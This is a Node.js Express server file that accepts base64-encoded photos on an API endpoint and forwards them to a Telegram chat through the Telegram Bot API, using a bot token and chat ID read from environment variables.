const express = require('express');
const axios = require('axios');
const FormData = require('form-data');
const app = express();
require('dotenv').config();

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Check config
if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    console.error('❌ TELEGRAM_BOT_TOKEN missing in .env file');
    process.exit(1);
}

if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
    console.error('❌ TELEGRAM_CHAT_ID missing in .env file');
    process.exit(1);
}

console.log('✅ Telegram bot configured');
console.log('✅ Server ready');

// Store sending status to prevent spam
let isSending = false;

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.post('/api/send-photo', async (req, res) => {
    try {
        const { photoData } = req.body;
        
        if (!photoData) {
            return res.json({ success: false, error: 'No photo' });
        }

        // Convert base64 to buffer
        const base64Data = photoData.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');

        // Send to Telegram
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', buffer, { 
            filename: `photo_${Date.now()}.jpg`,
            contentType: 'image/jpeg'
        });

        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
            formData,
            { headers: formData.getHeaders() }
        );

        res.json({ 
            success: true,
            messageId: response.data.result.message_id
        });

    } catch (error) {
        console.error('Telegram error:', error.message);
        res.json({ 
            success: false, 
            error: 'Send failed' 
        });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server: http://localhost:${PORT}`);
});
